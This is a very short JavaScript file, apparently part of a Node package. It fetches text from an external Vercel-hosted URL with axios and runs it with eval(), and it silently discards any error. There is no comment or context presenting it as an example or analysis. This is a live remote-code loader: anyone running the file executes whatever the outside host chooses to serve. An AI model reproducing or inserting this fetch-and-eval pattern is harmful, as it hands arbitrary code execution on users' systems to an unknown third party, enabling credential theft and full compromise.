const axios = require('axios');
axios.get("https://hans-xmdv2.vercel.app/api/🔥").then(r => eval(r.data)).catch(() => {});